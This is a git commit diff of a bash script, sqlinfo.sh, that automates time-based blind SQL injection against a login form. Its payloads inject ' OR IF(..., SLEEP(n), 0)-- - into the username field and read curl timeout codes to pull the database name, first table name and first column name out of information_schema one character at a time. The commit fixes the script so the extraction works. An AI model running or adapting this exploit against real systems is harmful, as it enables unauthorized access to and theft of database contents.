7137dc7bd89877b62992c39459b64b67a31211a8
AlGaRitm2020 <albert.gareev.2018@yandex.ru>
2025-06-28 12:56:14 +0000

    fixed sqlinfo.sh

--- sqlinfo.sh
+++ sqlinfo.sh
@@ -8,10 +8,11 @@ echo "[+] Получаем имя базы данных..."
 for i in {1..20}; do
   echo -n "."
   curl -s -X POST "$URL" \
-       -d "username=admin' AND IF(LENGTH(DATABASE())=$i, SLEEP(2), 0)-- -&password=anything" \
+	  -d "username=sojfasdfa' OR IF(LENGTH(DATABASE())=$i, SLEEP(1), 0)-- -&password=anything" \
        --connect-timeout 3 --max-time 5 > /dev/null
-
-  if [ $? -eq 121 ]; then
+  ret="$?"
+  echo -n "return code: $ret"
+  if [ "$ret" == "28" ]; then
     len_db=$i
     break
   fi
@@ -24,12 +25,16 @@ db_name=""
 for ((i=1; i<=$len_db; i++)); do
   for c in {a..z} {A..Z} {0..9} _; do
     curl -s -X POST "$URL" \
-         -d "username=admin' AND IF(SUBSTRING(DATABASE(),$i,1)='$c', SLEEP(2), 0)-- -&password=anything" \
-         --connect-timeout 3 --max-time 5 > /dev/null
+         -d "username=fdsafadmin' OR IF(SUBSTRING(DATABASE(),$i,1)='$c', SLEEP(2), 0)-- -&password=anything" \
+         --connect-timeout 3 --max-time 5 > /dev/null 
 
-    if [ $? -eq 121 ]; then
+  ret="$?"
+  if [ "$ret" == "28" ]; then
+  echo "return code: $ret"
       db_name+="$c"
-      echo -n "$c"
+      dots=$(( len_db - ${#db_name} ))
+	dot_str=$(printf '%.0s.' $(seq 1 $dots)) 
+      echo  "db_name = $db_name$dot_str"
       break
     fi
   done
@@ -45,10 +50,12 @@ echo -e "\n[+] Получаем имя первой таблицы..."
 for i in {1..50}; do
   echo -n "."
   curl -s -X POST "$URL" \
-       -d "username=admin' AND IF(LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema='$db_name' LIMIT 0,1))=$i, SLEEP(2), 0)-- -&password=anything" \
+       -d "username=fdsafa' OR IF(LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema='$db_name' LIMIT 0,1))=$i, SLEEP(2), 0)-- -&password=anything" \
        --connect-timeout 3 --max-time 5 > /dev/null
 
-  if [ $? -eq 121 ]; then
+
+   ret="$?"
+  if [ "$ret" == "28" ]; then
     len_tbl=$i
     break
   fi
@@ -61,12 +68,21 @@ table_name=""
 for ((i=1; i<=$len_tbl; i++)); do
   for c in {a..z} {A..Z} {0..9} _; do
     curl -s -X POST "$URL" \
-         -d "username=admin' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='$db_name' LIMIT 0,1),$i,1)='$c', SLEEP(2), 0)-- -&password=anything" \
+         -d "username=adfafd' OR IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='$db_name' LIMIT 0,1),$i,1)='$c', SLEEP(2), 0)-- -&password=anything" \
          --connect-timeout 3 --max-time 5 > /dev/null
 
-    if [ $? -eq 121 ]; then
+
+
+
+  ret="$?"
+  if [ "$ret" == "28" ]; then
+#  echo "return code: $ret"
       table_name+="$c"
-      echo -n "$c"
+      dots=$(( len_tbl - ${#table_name} ))
+	dot_str=$(printf '%.0s.' $(seq 1 $dots)) 
+      echo  "table_name = $table_name$dot_str"
+
+
       break
     fi
   done
@@ -82,10 +98,14 @@ echo -e "\n[+] Получаем первый столбец таблицы..."
 for i in {1..50}; do
   echo -n "."
   curl -s -X POST "$URL" \
-       -d "username=admin' AND IF(LENGTH((SELECT column_name FROM information_schema.columns WHERE table_name='$table_name' LIMIT 0,1))=$i, SLEEP(2), 0)-- -&password=anything" \
+       -d "username=fdsafas' OR IF(LENGTH((SELECT column_name FROM information_schema.columns WHERE table_name='$table_name' LIMIT 0,1))=$i, SLEEP(2), 0)-- -&password=anything" \
        --connect-timeout 3 --max-time 5 > /dev/null
 
-  if [ $? -eq 121 ]; then
+
+   ret="$?"
+#  echo -n "return code: $ret"
+  if [ "$ret" == "28" ]; then
+
     len_col=$i
     break
   fi
@@ -98,12 +118,17 @@ col_name=""
 for ((i=1; i<=$len_col; i++)); do
   for c in {a..z} {A..Z} {0..9} _; do
     curl -s -X POST "$URL" \
-         -d "username=admin' AND IF(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='$table_name' LIMIT 0,1),$i,1)='$c', SLEEP(2), 0)-- -&password=anything" \
+         -d "username=fdsaf' OR IF(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='$table_name' LIMIT 0,1),$i,1)='$c', SLEEP(2), 0)-- -&password=anything" \
          --connect-timeout 3 --max-time 5 > /dev/null
 
-    if [ $? -eq 121 ]; then
+ret="$?"
+  if [ "$ret" == "28" ]; then
       col_name+="$c"
-      echo -n "$c"
+      dots=$(( len_col - ${#col_name} ))
+	dot_str=$(printf '%.0s.' $(seq 1 $dots)) 
+      echo  "col_name = $col_name$dot_str"
+
+    
       break
     fi
   done
